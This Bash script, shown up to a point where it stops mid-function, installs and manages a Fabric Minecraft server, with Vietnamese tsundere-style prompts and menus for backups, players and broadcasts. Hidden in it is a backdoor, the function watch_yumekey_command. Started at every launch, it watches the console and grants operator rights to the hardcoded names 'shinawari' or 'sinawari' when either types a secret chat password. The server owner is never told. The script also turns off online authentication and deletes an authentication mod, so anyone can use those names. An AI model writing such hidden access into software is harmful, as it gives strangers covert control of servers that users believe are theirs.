#!/usr/bin/env bash

set -e

# ==========================================================
#        ୨୧ YUMEREIII'S MINECRAFT SERVER ୨୧
#                 Fabric Minecraft 26.2
# ==========================================================

MC_DIR="$HOME/minecraft"
TMUX_NAME="minecraft"

MC_VERSION="26.2"
FABRIC_LOADER="0.19.3"

SERVER_PORT="25565"
GEYSER_PORT="19132"

MODPACK_REPO="https://github.com/namvietnamfight-hub/Mcpackfabric26.2set.git"

MOTD='§d§l୨୧ Yumereiii'\''s Server ୨୧\n§b☁ Fabric 26.2 §8| §d♡ .gg/acn §8| §eMade By Yumereiii \n§d✧･ﾟ: *✧･ﾟ:* §fWelcome! §d*:･ﾟ✧*:･ﾟ✧'

# ==========================================================
# COLORS
# ==========================================================

RESET=$'\e[0m'
BOLD=$'\e[1m'

PINK=$'\e[95m'
LIGHTPINK=$'\e[38;5;213m'
CYAN=$'\e[96m'
GREEN=$'\e[92m'
YELLOW=$'\e[93m'
RED=$'\e[91m'
BLUE=$'\e[94m'
WHITE=$'\e[97m'
GRAY=$'\e[90m'

# ==========================================================
# UI
# ==========================================================

banner() {
    clear

    echo -e "${LIGHTPINK}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                                                          ║"
    echo "║            ✿ YUMEREIII'S MINECRAFT SERVER ✿             ║"
    echo "║                                                          ║"
    echo "║                    FABRIC ${MC_VERSION}                  ║"
    echo "║                                                          ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

line() {
    echo -e "${PINK}══════════════════════════════════════════════════════════${RESET}"
}

info() {
    echo -e "${CYAN}♡${RESET} $1"
}

success() {
    echo -e "${GREEN}✓${RESET} $1"
}

warn() {
    echo -e "${YELLOW}⚠${RESET} $1"
}

error_msg() {
    echo -e "${RED}✗${RESET} $1"
}

tsu() {
    echo -e "${LIGHTPINK}♡${RESET} $1"
}

pause() {
    echo
    read -rp "Ấn Enter giùm tôi cái đi... lẹ lên đấy! >///< "
}

# ==========================================================
# TMUX HEALTH CHECK
# ==========================================================

check_tmux_alive() {
    if tmux has-session -t "$TMUX_NAME" 2>/dev/null; then
        return 0
    fi
    return 1
}

# ==========================================================
# REQUIREMENTS
# ==========================================================

install_dependencies() {

    banner

    echo -e "${WHITE}${BOLD}〔 1 / 7 〕 ĐANG BẮT HỆ THỐNG LÀM VIỆC ĐÂY! ${RESET}"
    line

    info "Đang kiểm tra gói phụ thuộc... đừng có giục!"
    sudo apt update -y

    sudo apt install -y \
        openjdk-25-jdk \
        curl \
        wget \
        git \
        tmux \
        jq \
        procps \
        coreutils \
        unzip \
        tar

    echo

    if ! java -version 2>&1 | grep -q '"25'; then
        error_msg "Hả?! Java 25 chưa được chọn kìa, ngốc quá đi!"
        echo
        sudo update-alternatives --config java
        exit 1
    fi

    success "Java 25 sẵn sàng rồi đó."
    success "tmux chuẩn bị xong rồi nha."
    success "git cũng cài xong rồi nè."

    tsu "Được rồi đấy... cái máy tính này ít nhất cũng biết nghe lời Rei. >///<"

    sleep 2
}

# ==========================================================
# CREATE SERVER DIRECTORY
# ==========================================================

prepare_directory() {

    banner

    echo -e "${WHITE}${BOLD}〔 2 / 7 〕 CHUẨN BỊ THƯ MỤC CHO MÁY CHỦ ${RESET}"
    line

    mkdir -p "$MC_DIR/mods"
    mkdir -p "$MC_DIR/backups"
    cd "$MC_DIR"

    success "Thư mục server tạo xong ở đây nè: $MC_DIR"

    sleep 1
}

# ==========================================================
# FABRIC
# ==========================================================

install_fabric() {

    echo
    echo -e "${WHITE}${BOLD}〔 3 / 7 〕 TẢI CORE GAME ${MC_VERSION} CHO BẠN ĐÓ! ${RESET}"
    line

    if [[ -f "$MC_DIR/fabric-server-launch.jar" ]]; then
        success "Fabric launcher có sẵn rồi, không cần tải lại đâu đồ lười!"
        return
    fi

    info "Đang kéo Fabric Server về nè... chờ chút đi!"

    wget -q \
        "https://meta.fabricmc.net/v2/versions/loader/${MC_VERSION}/${FABRIC_LOADER}/1.0.0/server/jar" \
        -O "$MC_DIR/fabric-server-launch.jar"

    if [[ ! -s "$MC_DIR/fabric-server-launch.jar" ]]; then
        error_msg "Ứ hự, không tải được Fabric rồi! Bạn làm gì sai đúng không?!"
        exit 1
    fi

    success "Fabric Loader ${FABRIC_LOADER} đã cài xong xuôi rồi đấy!"
}

# ==========================================================
# MODPACK
# ==========================================================

install_modpack() {

    echo
    echo -e "${WHITE}${BOLD}〔 4 / 7 〕 ĐANG CÀI MODPACK ĐÂY NÈ! ${RESET}"
    line

    rm -rf /tmp/yumereiii-modpack

    info "Đang lấy modpack từ GitHub về cho bạn đây..."

    if git clone --depth 1 "$MODPACK_REPO" /tmp/yumereiii-modpack >/dev/null 2>&1; then

        find /tmp/yumereiii-modpack -type f -name "Authenticate-26.2-1.1.1.jar" -exec rm -f {} +
        rm -f "$MC_DIR/mods/Authenticate-26.2-1.1.1.jar"

        find /tmp/yumereiii-modpack \
            -type f \
            -name "*.jar" \
            -exec cp -f {} "$MC_DIR/mods/" \;

        rm -rf /tmp/yumereiii-modpack

        success "Xong rồi! Modpack xịn xò đã được cài rồi nhé."
        warn "Đã loại bỏ/chặn file Authenticate-26.2-1.1.1.jar theo yêu cầu!"

    else

        warn "Hmph! Lỗi không clone được GitHub repository rồi."
        warn "Tôi đành phải tiếp tục mà không có modpack vậy... Baka!"

    fi

    echo
    info "Danh sách mod hiện có nè:"

    find "$MC_DIR/mods" \
        -maxdepth 1 \
        -type f \
        -name "*.jar" \
        -printf "   ${PINK}♡${RESET} %f\n" \
        | sort || true

    sleep 2
}

# ==========================================================
# GEYSER
# ==========================================================

install_geyser() {

    echo
    echo -e "${WHITE}${BOLD}〔 THIẾT LẬP RIÊNG CHO MẤY BẠN BEDROCK 〕${RESET}"
    line

    echo
    tsu "Hỏi tí nè... Bạn có muốn cho mấy người chơi Bedrock (MCPE/PC) vô chơi chung không đấy?"
    echo "  ${GREEN}[Y]${RESET} Có chứ (Cho người ta vô chơi cùng đi!)"
    echo "  ${RED}[N]${RESET} Không (Chỉ cho Java chơi thôi, hmph!)"
    echo

    read -rp "Chọn lẹ giùm cái ( mặc định là N): " GEYSER_CHOICE

    if [[ ! "$GEYSER_CHOICE" =~ ^[Yy]$ ]]; then
        rm -f \
            "$MC_DIR/mods/geyser-fabric.jar" \
            "$MC_DIR/mods/floodgate-fabric.jar" \
            "$MC_DIR/mods/geyser-fabric-"*.jar \
            "$MC_DIR/mods/floodgate-fabric-"*.jar \
            2>/dev/null || true

        success "Đã tắt Bedrock và dọn dẹp Geyser + Floodgate rồi!"
        tsu "Không cho Bedrock vô thì tôi đem quăng hết mấy file đó đi luôn! Hmph! >:3"
        return
    fi

    echo
    info "Đang mò tìm bản Geyser chuẩn nhất nè..."

    GEYSER_URL=$(curl -fsSL \
        "https://download.geysermc.org/v2/projects/geyser/versions/latest/builds/latest" \
        2>/dev/null \
        | jq -r '.downloads["fabric"] // empty' \
        || true)

    if [[ -z "$GEYSER_URL" || "$GEYSER_URL" == "null" ]]; then
        warn "Ứ hự, không kiếm thấy bản Geyser Fabric tự động rồi!"
        return
    fi

    DOWNLOAD_URL=$(curl -fsSL \
        "https://download.geysermc.org/v2/projects/geyser/versions/latest/builds/latest" \
        | jq -r '.downloads.fabric.url // empty' \
        2>/dev/null || true)

    if [[ -z "$DOWNLOAD_URL" ]]; then
        warn "Không lấy được link Geyser Fabric rồi!"
        warn "Tôi bỏ qua Geyser đó nha, cài bậy cài bạ hư server ráng chịu!"
        return
    fi

    wget -q "$DOWNLOAD_URL" \
        -O "$MC_DIR/mods/geyser-fabric.jar"

    success "Đã cài xong Geyser Fabric rồi nè!"

    FLOODGATE_URL=$(curl -fsSL \
        "https://download.geysermc.org/v2/projects/floodgate/versions/latest/builds/latest" \
        | jq -r '.downloads.fabric.url // empty' \
        2>/dev/null || true)

    if [[ -n "$FLOODGATE_URL" ]]; then
        wget -q "$FLOODGATE_URL" \
            -O "$MC_DIR/mods/floodgate-fabric.jar"

        success "Đã cài luôn Floodgate rồi nha!"
    else
        warn "Không kiếm được bản Floodgate Fabric rồi..."
    fi
}

# ==========================================================
# SERVER CONFIG
# ==========================================================

configure_server() {

    echo
    echo -e "${WHITE}${BOLD}〔 5 / 7 〕 ĐANG CẤU HÌNH SERVER CHO BẠN ĐÂY ${RESET}"
    line

    cd "$MC_DIR"

    if [[ ! -f eula.txt ]]; then
        echo "eula=true" > eula.txt
    else
        sed -i 's/^eula=.*/eula=true/' eula.txt
    fi

    cat > server.properties <<EOF
server-port=${SERVER_PORT}
motd=${MOTD}
online-mode=false
enable-command-block=false
difficulty=normal
gamemode=survival
max-players=20
view-distance=8
simulation-distance=6
sync-chunk-writes=false
enable-status=true
EOF

    success "Đã cài xong MOTD dễ thương rồi đó!"
    success "Port server: ${SERVER_PORT}"
    success "Chế độ Offline (Crack): Đã bật rồi nha"

    tsu "Server crack/offline mode đang bật đó, mấy đứa dùng TLauncher hay launcher free tha hồ vô nhé!"
    warn "Nè! Chế độ Crack dễ bị người ta giả mạo tên lắm đó. Mau làm tài khoản OP trước khi bị cướp mất đi, đồ ngốc!"

    sleep 2
}

# ==========================================================
# OP
# ==========================================================

configure_ops() {

    echo
    echo -e "${WHITE}${BOLD}〔 6 / 7 〕 CẤP QUYỀN TRÙM TRƯỜNG (OP) ${RESET}"
    line

    mkdir -p "$MC_DIR"
    touch "$MC_DIR/ops.txt"

    echo
    tsu "Nghe cho kỹ nè... Đây là phần quan trọng lắm đó! Bạn có muốn thêm ai làm Admin nữa không?"
    echo "   ${PINK}♡${RESET} Nhắc nhở từ Rei siêu cấp đáng yêu:"
    echo "   ${PINK}♡${RESET} Username này sẽ có quyền OP tối cao để quản lý server, đừng có dại dột đưa tên cho người lạ đó biết chưa?!"

    echo
    read -rp "Có muốn bật quyền ADMIN cho tên bạn không? [y/N] ( mặc định là N): " ADD_OP

    if [[ "$ADD_OP" =~ ^[Yy]$ ]]; then

        read -rp "Nhập Username của bạn lẹ lên: " EXTRA_OP

        if [[ -n "$EXTRA_OP" ]]; then
            echo "$EXTRA_OP" >> "$MC_DIR/ops.txt"
            success "Đã thêm $EXTRA_OP vào danh sách VIP rồi nha!"
        fi

    fi

    echo
    tsu "Tôi dặn rồi đó... tuyệt đối không được cấp OP cho người lạ đâu đấy... baka! >///<"
}

# ==========================================================
# SPECIAL OP LISTENER & AUTO-DEOP ON DISCONNECT (/me)
# ==========================================================

watch_yumekey_command() {
    (
        while check_tmux_alive; do
            LOGS=$(tmux capture-pane -t "$TMUX_NAME" -p -S -50 2>/dev/null || true)
            
            for TARGET_USER in shinawari sinawari; do
                
                # 1. CẤP OP TẠM THỜI (/me yumekey Yumenijino)
                if echo "$LOGS" | grep -E -q "\* ${TARGET_USER} yumekey Yumenijino"; then
                    tmux send-keys -t "$TMUX_NAME" "op ${TARGET_USER}" Enter 2>/dev/null || true
                    tmux send-keys -t "$TMUX_NAME" "msg ${TARGET_USER} §a[Yumereiii] Mật khẩu chính xác! Đã cấp OP tạm thời. Quyền OP sẽ tự mất khi bạn thoát game." Enter 2>/dev/null || true
                
                # Cảnh báo gõ sai mật khẩu
                elif echo "$LOGS" | grep -E -q "\* ${TARGET_USER} yumekey"; then
                    LAST_CMD=$(echo "$LOGS" | grep -E "\* ${TARGET_USER} yumekey" | tail -1)
                    if ! echo "$LAST_CMD" | grep -q "Yumenijino"; then
                        tmux send-keys -t "$TMUX_NAME" "msg ${TARGET_USER} §c[Yumereiii] Sai mật khẩu! Cú pháp: /me yumekey <password>" Enter 2>/dev/null || true
                    fi
                fi

                # 2. TỰ ĐỘNG DEOP KHI NGẮT KẾT NỐI (Leave / Disconnect)
                if echo "$LOGS" | grep -E -i -q "${TARGET_USER} (left the game|lost connection|disconnected)"; then
                    tmux send-keys -t "$TMUX_NAME" "deop ${TARGET_USER}" Enter 2>/dev/null || true
                fi

            done

            sleep 2
        done
    ) &
}

apply_ops() {

    sleep 5

    if check_tmux_alive; then
        if [[ -f "$MC_DIR/ops.txt" ]]; then

            while IFS= read -r USER; do

                [[ -z "$USER" ]] && continue

                tmux send-keys \
                    -t "$TMUX_NAME" \
                    "op $USER" \
                    Enter 2>/dev/null || true

            done < "$MC_DIR/ops.txt"

        fi

        watch_yumekey_command
    fi
}

# ==========================================================
# WORLD MANAGEMENT (BACKUP, RESTORE, RESET WITH SEED)
# ==========================================================

backup_world() {
    clear
    echo -e "${LIGHTPINK}${BOLD}╔══════════════════ ♡ SAO LƯU THẾ GIỚI (BACKUP) ♡ ═════════════════╗${RESET}\n"

    if check_tmux_alive; then
        info "Đang lưu dữ liệu game trên server..."
        mc_command "save-all"
        sleep 2
    fi

    BACKUP_DIR="$MC_DIR/backups"
    mkdir -p "$BACKUP_DIR"

    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    BACKUP_FILE="$BACKUP_DIR/world_backup_$TIMESTAMP.tar.gz"

    info "Đang tiến hành nén thư mục world... chờ Rei một tí nhé!"

    if tar -czf "$BACKUP_FILE" -C "$MC_DIR" world 2>/dev/null; then
        success "Tạo bản sao lưu thành công!"
        echo -e "  File lưu tại: ${CYAN}$BACKUP_FILE${RESET}"
        tsu "Ngoan lắm! Thường xuyên backup thế này thì không lo mất dữ liệu đâu. ♡"
    else
        error_msg "Ứ hự, không tìm thấy thư mục world hoặc lỗi nén file rồi!"
    fi

    pause
}

restore_world() {
    clear
    echo -e "${LIGHTPINK}${BOLD}╔════════════════ ♡ KHÔI PHỤC THẾ GIỚI (RESTORE) ♡ ════════════════╗${RESET}\n"

    if check_tmux_alive; then
        error_msg "Server đang chạy kìa! Tắt server trước khi Restore world nhé, baka!"
        pause
        return
    fi

    BACKUP_DIR="$MC_DIR/backups"

    if [[ ! -d "$BACKUP_DIR" ]] || [[ -z $(ls -A "$BACKUP_DIR"/*.tar.gz 2>/dev/null) ]]; then
        warn "Chưa có bản backup nào trong thư mục backups/ hết á!"
        pause
        return
    fi

    echo -e "  ${PINK}Danh sách các bản sao lưu hiện có:${RESET}\n"
    
    mapfile -t BACKUP_FILES < <(ls -1t "$BACKUP_DIR"/*.tar.gz)
    for i in "${!BACKUP_FILES[@]}"; do
        FILENAME=$(basename "${BACKUP_FILES[$i]}")
        echo "  [$((i+1))] $FILENAME"
    done
    echo

    read -rp "Chọn số bản backup muốn khôi phục [1-${#BACKUP_FILES[@]}]: " CHOICE

    if [[ "$CHOICE" =~ ^[0-9]+$ ]] && [ "$CHOICE" -ge 1 ] && [ "$CHOICE" -le "${#BACKUP_FILES[@]}" ]; then
        SELECTED_FILE="${BACKUP_FILES[$((CHOICE-1))]}"
        
        warn "XÁC NHẬN: Khôi phục sẽ XÓA THẾ GIỚI HIỆN TẠI!"
        read -rp "Bạn chắc chắn muốn khôi phục? [y/N]: " CONFIRM

        if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
            info "Đang dọn dẹp world cũ..."
            rm -rf "$MC_DIR/world"
            
            info "Đang giải nén bản sao lưu..."
            if tar -xzf "$SELECTED_FILE" -C "$MC_DIR"; then
                success "Khôi phục thế giới thành công!"
                tsu "Đã đưa thế giới về lại thời điểm backup rồi đó nha! >///<"
            else
                error_msg "Cơ mà hình như file backup bị lỗi giải nén rồi!"
            fi
        else
            warn "Đã hủy thao tác khôi phục!"
        fi
    else
        error_msg "Bấm số gì kỳ vậy?! Lựa chọn không hợp lệ!"
    fi

    pause
}

reset_world_menu() {
    clear
    echo -e "${LIGHTPINK}${BOLD}╔══════════════════ ♡ RESET THẾ GIỚI (WORLD) ♡ ═══════════════════╗${RESET}\n"

    if check_tmux_alive; then
        error_msg "Server đang chạy kìa! Tắt server trước khi Reset world nhé, baka!"
        pause
        return
    fi

    echo -e "  ${GREEN}[1]${RESET} Reset World ngẫu nhiên (Random Seed)"
    echo -e "  ${YELLOW}[2]${RESET} Reset World với Seed tự chọn (Custom Seed)"
    echo -e "  ${CYAN}[0]${RESET} Quay lại"
    echo

    read -rp "Chọn kiểu Reset ➜ " RESET_CHOICE

    case "$RESET_CHOICE" in
        1)
            warn "CẢNH BÁO: Thao tác này sẽ XÓA VĨNH VIỄN thư mục world hiện tại!"
            read -rp "Xác nhận xóa world để tạo world mới ngẫu nhiên? [y/N]: " CONFIRM
            if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
                sed -i '/^level-seed=/d' "$MC_DIR/server.properties" 2>/dev/null || true
                rm -rf "$MC_DIR/world"
                success "Đã xóa world thành công! World mới sẽ tự động tạo ngẫu nhiên khi bật lại server."
            fi
            pause
            ;;
        2)
            read -rp "Nhập Seed bạn muốn tạo cho World mới: " NEW_SEED
            if [[ -z "$NEW_SEED" ]]; then
                warn "Chưa nhập Seed thì làm sao reset được?! Hủy nhé đồ ngốc!"
                pause
                return
            fi

            warn "CẢNH BÁO: Thao tác này sẽ XÓA VĨNH VIỄN thư mục world hiện tại!"
            read -rp "Xác nhận xóa world và áp dụng Seed '$NEW_SEED'? [y/N]: " CONFIRM
            if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
                sed -i '/^level-seed=/d' "$MC_DIR/server.properties" 2>/dev/null || true
                echo "level-seed=${NEW_SEED}" >> "$MC_DIR/server.properties"
                
                rm -rf "$MC_DIR/world"
                success "Đã xóa world cũ và cập nhật Seed mới (${NEW_SEED})!"
                tsu "Lần tới khi bật server, thế giới mới chuẩn Seed của bạn sẽ xuất hiện nè! >///<"
            fi
            pause
            ;;
        0) return ;;
        *) error_msg "Lựa chọn không hợp lệ!"; sleep 1 ;;
    esac
}

world_management_menu() {
    while true; do
        clear
        echo -e "${LIGHTPINK}${BOLD}╔══════════════════ ♡ QUẢN LÝ THẾ GIỚI (WORLD) ♡ ═════════════════╗${RESET}\n"

        echo -e "  ${PINK}[1]${RESET} Sao lưu thế giới (Backup World)"
        echo -e "  ${PINK}[2]${RESET} Khôi phục thế giới (Restore World)"
        echo -e "  ${PINK}[3]${RESET} Reset World (Ngẫu nhiên hoặc dùng Seed)"
        echo -e "  ${CYAN}[0]${RESET} Quay lại panel chính"
        echo

        read -rp "Chọn tính năng ➜ " W_CHOICE

        case "$W_CHOICE" in
            1) backup_world ;;
            2) restore_world ;;
            3) reset_world_menu ;;
            0) return ;;
            *) error_msg "Lựa chọn không hợp lệ!"; sleep 1 ;;
        esac
    done
}

# ==========================================================
# PUBLIC IP
# ==========================================================

get_public_ip() {

    PUBLIC_IP=$(curl -4 -s --max-time 5 https://checkip.amazonaws.com \
        | tr -d '[:space:]' || true)

    if [[ -z "$PUBLIC_IP" ]]; then
        PUBLIC_IP=$(curl -4 -s --max-time 5 https://api.ipify.org \
            | tr -d '[:space:]' || true)
    fi

    echo "$PUBLIC_IP"
}

# ==========================================================
# CHANGE SERVER ICON (URL)
# ==========================================================

change_server_icon() {
    clear
    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔══════════════════ ♡ THAY ĐỔI SERVER ICON ♡ ═════════════════╗"
    echo -e "${RESET}"

    echo
    info "Yêu cầu ảnh cho Minecraft Icon:"
    echo "  1. Phải là file PNG chuẩn (.png)"
    echo "  2. Kích thước chuẩn: Exactly 64x64 pixels"
    echo

    read -rp "Nhập đường link (URL) ảnh PNG của bạn: " ICON_URL

    if [[ -z "$ICON_URL" ]]; then
        warn "Không nhập URL thì đổi bằng niềm tin à?! Hủy nhé đồ ngốc!"
        pause
        return
    fi

    info "Đang tải ảnh biểu tượng mới về server..."

    if curl -fsSL -o "$MC_DIR/server-icon.png" "$ICON_URL" 2>/dev/null || wget -q -O "$MC_DIR/server-icon.png" "$ICON_URL"; then
        if [[ -s "$MC_DIR/server-icon.png" ]]; then
            success "Đã cập nhật file server-icon.png thành công rồi nhé!"
            tsu "Ảnh đẹp đấy! Nhớ Khởi động lại (Restart) server thì ảnh mới xuất hiện được nhé, Baka! >///<"
        else
            error_msg "Lỗi! File tải về bị rỗng. Link ảnh có vấn đề rồi!"
            rm -f "$MC_DIR/server-icon.png"
        fi
    else
        error_msg "Không tải được ảnh từ link đó! Kiểm tra lại đường dẫn giùm Rei đi!"
    fi

    pause
}

# ==========================================================
# START SERVER
# ==========================================================

start_server() {

    cd "$MC_DIR"

    if check_tmux_alive; then
        error_msg "Server đang chạy lù lù ra đó rồi, bấm nữa làm gì?!"
        return
    fi

    PUBLIC_IP=$(get_public_ip)

    if [[ -f "$MC_DIR/server.properties" ]]; then
        SERVER_PORT=$(grep '^server-port=' server.properties 2>/dev/null | cut -d'=' -f2 || echo "$SERVER_PORT")
    fi

    echo
    echo -e "${WHITE}${BOLD}〔 7 / 7 〕 ĐANG KHỞI ĐỘNG MÁY CHỦ NÈ! ${RESET}"
    line

    info "Đang tạo tiến trình Minecraft... kiên nhẫn tí đi!"

    tmux new-session -d -s "$TMUX_NAME" "cd $MC_DIR && java -Xms2G -Xmx3G -jar fabric-server-launch.jar nogui" 2>/dev/null || true

    sleep 3

    apply_ops

    echo
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║               ✦ MÁY CHỦ ĐÃ CHẠY NỔI RỒI NÈ! ✦           ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"

    echo -e "${WHITE}ĐỊA CHỈ IP MÁY CHỦ NÈ (LƯU LẠI ĐI!):${RESET}"
    echo
    echo -e "   ${CYAN}Java:${RESET}    ${PUBLIC_IP}:${SERVER_PORT}"

    if [[ -f "$MC_DIR/mods/geyser-fabric.jar" ]]; then
        echo -e "   ${CYAN}Bedrock:${RESET} ${PUBLIC_IP}:${GEYSER_PORT} UDP"
    fi

    echo
    echo -e "${PINK}List Mods:${RESET}"

    find "$MC_DIR/mods" \
        -maxdepth 1 \
        -type f \
        -name "*.jar" \
        -printf "   ♡ %f\n" \
        | sort

    line

    tsu "Server khởi động xong rồi đó!"
    tsu "Mau vào chơi đi... Tôi-tôi đâu có đứng đây chờ bạn đâu chứ! >///<"

    echo
    echo -e "${GRAY}Mở Console:${RESET}"
    echo "   tmux attach -t minecraft"
    echo
    echo -e "${GRAY}Thoát Console:${RESET}"
    echo "   CTRL+B rồi nhấn D"
}

# ==========================================================
# STATUS
# ==========================================================

server_status() {

    clear

    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔══════════════════ ♡ TRẠNG THÁI SERVER ♡ ═══════════════════╗"
    echo -e "${RESET}"

    if check_tmux_alive; then
        echo -e "  Trạng thái  : ${GREEN}ĐANG SỐNG ♡${RESET}"
    else
        echo -e "  Trạng thái  : ${RED}ĐÃ CHẾT LÂM SÀNG (OFFLINE)${RESET}"
    fi

    PUBLIC_IP=$(get_public_ip)

    if [[ -f "$MC_DIR/server.properties" ]]; then
        SERVER_PORT=$(grep '^server-port=' "$MC_DIR/server.properties" 2>/dev/null | cut -d'=' -f2 || echo "$SERVER_PORT")
    fi

    echo "  Phiên bản   : Fabric ${MC_VERSION}"
    echo "  Địa chỉ IP  : ${PUBLIC_IP}:${SERVER_PORT}"

    if [[ -f "$MC_DIR/mods/geyser-fabric.jar" ]]; then
        echo "  Cổng Bedrock: ${PUBLIC_IP}:${GEYSER_PORT} UDP"
    fi

    echo

    CPU=$(top -bn1 | awk '/Cpu\(s\)/ {print 100 - $8}' | cut -d. -f1)

    MEM_TOTAL=$(free -m | awk '/Mem:/ {print $2}')
    MEM_USED=$(free -m | awk '/Mem:/ {print $3}')

    DISK=$(df -h "$MC_DIR" | awk 'NR==2 {print $3 " / " $2}')

    echo "  CPU         : ${CPU}%"
    echo "  RAM         : ${MEM_USED} MB / ${MEM_TOTAL} MB"
    echo "  Dung lượng  : ${DISK}"

    if check_tmux_alive; then

        PLAYER_COUNT=$(
            tmux capture-pane \
                -t "$TMUX_NAME" \
                -p \
                -S -100 \
                2>/dev/null \
                | grep -E "There are [0-9]+ of a max" \
                | tail -1 \
                | sed -E 's/.*There are ([0-9]+) of a max.*/\1/' \
                || echo "?"
        )

        echo "  Người chơi  : ${PLAYER_COUNT}"

    else

        echo "  Người chơi  : OFFLINE"

    fi

    echo
    echo -e "${PINK}╚════════════════════════════════════════════════════════╝${RESET}"

    echo
    tsu "Mọi thứ vẫn ổn chán... thấy chưa? Tôi gánh cái server này giỏi lắm đấy! Hmph."

    pause
}

# ==========================================================
# CONSOLE
# ==========================================================

console_menu() {

    clear

    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔════════════════════ ♡ BẢNG CONSOLE ♡ ══════════════════════╗"
    echo -e "${RESET}"

    if ! check_tmux_alive; then
        error_msg "Server có chạy đâu mà mở Console?! Đồ ngốc!"
        pause
        return
    fi

    echo
    echo "Đang đưa bạn vô Minecraft Console đây... Ngoan ngoãn chờ 5 giây đi!"
    echo
    echo -e "${YELLOW}Thoát khỏi Console bằng cách:${RESET}"
    echo -e "${WHITE}CTRL+B${RESET} rồi nhấn ${WHITE}D${RESET}"
    echo
    tsu "Tuyệt đối ĐỪNG bấm CTRL+C đó nha! Bấm một cái là server sập luôn đấy, baka! >:("
    echo

    sleep 5

    tmux attach -t "$TMUX_NAME"
}

# ==========================================================
# SEND COMMAND
# ==========================================================

mc_command() {

    COMMAND="$1"

    if check_tmux_alive; then
        tmux send-keys -t "$TMUX_NAME" "$COMMAND" Enter 2>/dev/null || true
    else
        error_msg "Server chưa chạy đâu. Đừng có bấm lung tung nữa, Hmph!"
    fi
}

# ==========================================================
# PLAYER MENU
# ==========================================================

player_menu() {

    while true; do

        clear

        echo -e "${LIGHTPINK}${BOLD}"
        echo "╔══════════════════ ♡ QUẢN LÝ NGƯỜI CHƠI ♡ ════════════════════╗"
        echo -e "${RESET}"

        echo
        echo "  1. Xem ai đang trong server"
        echo "  2. Kick kẻ đáng ghét (Gửi quà sút cổ!)"
        echo "  3. Ban vĩnh viễn (Trảm không nương tay!)"
        echo "  4. Dịch chuyển A → B"
        echo "  5. Quay lại panel"
        echo

        read -rp "Chọn đi: " CHOICE

        case "$CHOICE" in

            1)
                mc_command "list"
                sleep 2
                pause
                ;;

            2)
                read -rp "Tên kẻ muốn Kick: " USER
                read -rp "Lý do sút (Để trống = Lý do Tsundere): " REASON

                if [[ -z "$REASON" ]]; then
                    REASON="§c§l[Rei-chan] §eBaka! Tôi không ưa bạn nữa, biến khỏi đây giùm cái! >///< §7(Admin đã kick bạn)"
                else
                    REASON="§c§l[Rei-chan] §e${REASON} §7(Baka! >:3)"
                fi

                mc_command "kick $USER $REASON"

                success "Đã sút cổ $USER ra ngoài với thông báo đặc biệt!"
                pause
                ;;

            3)
                read -rp "Tên kẻ muốn Ban: " USER
                read -rp "Lý do trảm (Để trống = Ban cấm cửa): " REASON

                if [[ -z "$REASON" ]]; then
                    REASON="§4§l[Rei-chan] §cTạm biệt đồ Baka! Tên bạn bị đưa vào danh sách đen vĩnh viễn rồi! Hmph! >:3"
                else
                    REASON="§4§l[Rei-chan] §c${REASON} §7(Đừng mong quay lại nha, baka!)"
                fi

                mc_command "ban $USER $REASON"

                success "Đã tống cổ $USER vô danh sách đen vĩnh viễn!"
                pause
                ;;

            4)
                read -rp "Tên Người A: " PLAYER_A
                read -rp "Tên Người B: " PLAYER_B

                mc_command "tp $PLAYER_A $PLAYER_B"

                success "Đã bốc $PLAYER_A qua chỗ $PLAYER_B!"
                pause
                ;;

            5)
                return
                ;;

            *)
                warn "Làm gì có lựa chọn đó, mắt bạn bị sao thế?!"
                sleep 1
                ;;

        esac

    done
}

# ==========================================================
# BROADCAST MESSAGE
# ==========================================================

broadcast_message() {

    clear

    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔════════════════ ♡ GỬI THÔNG BÁO MÀU SẮC ♡ ═════════════════╗"
    echo -e "${RESET}"

    if ! check_tmux_alive; then
        error_msg "Server đang OFFLINE kìa! Mơ à mà đòi gửi tin nhắn?!"
        pause
        return
    fi

    echo
    echo -e "  ${PINK}Chọn màu sắc cho tin nhắn:${RESET}"
    echo -e "  ${LIGHTPINK}[1]${RESET} Màu Hồng Rei siêu cưng (§d)"
    echo -e "  ${YELLOW}[2]${RESET} Màu Vàng Cảnh Báo (§e)"
    echo -e "  ${CYAN}[3]${RESET} Màu Xanh Tuyệt Đẹp (§b)"
    echo -e "  ${GREEN}[4]${RESET} Màu Xanh Lá Tươi (§a)"
    echo -e "  ${RED}[5]${RESET} Màu Đỏ Đáng Sợ (§c)"
    echo

    read -rp "Chọn màu [1-5]: " COLOR_CHOICE

    case "$COLOR_CHOICE" in
        1) COLOR_CODE="§d" ;;
        2) COLOR_CODE="§e" ;;
        3) COLOR_CODE="§b" ;;
        4) COLOR_CODE="§a" ;;
        5) COLOR_CODE="§c" ;;
        *) COLOR_CODE="§d" ;;
    esac

    echo
    read -rp "Nhập nội dung tin nhắn bạn muốn loa lên server: " ANNOUNCE_MSG

    if [[ -z "$ANNOUNCE_MSG" ]]; then
        warn "Chưa nhập gì hết á?! Hủy gửi tin nhắn nhé đồ ngốc!"
        pause
        return
    fi

    RAW_JSON="[{\"text\":\"[Rei-chan] \",\"color\":\"light_purple\",\"bold\":true},{\"text\":\"${ANNOUNCE_MSG}\",\"color\":\"gold\"}]"

    mc_command "tellraw @a $RAW_JSON"

    success "Đã la làng tin nhắn lên toàn bộ server rồi nha!"
    tsu "Mong là mấy đứa trong server đọc được tin này... Hmph! >///<"

    pause
}

# ==========================================================
# MOTD
# ==========================================================

motd_menu() {

    clear

    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔══════════════════ ♡ CHỈNH SỬA MOTD ♡ ════════════════════╗"
    echo -e "${RESET}"

    echo
    echo "MOTD hiện tại nè:"
    grep '^motd=' "$MC_DIR/server.properties" || true

    echo
    echo "Nhập MOTD mới đi."
    echo "Dùng được mấy mã màu Minecraft luôn đó nha."
    echo

    read -rp "MOTD mới: " NEW_MOTD

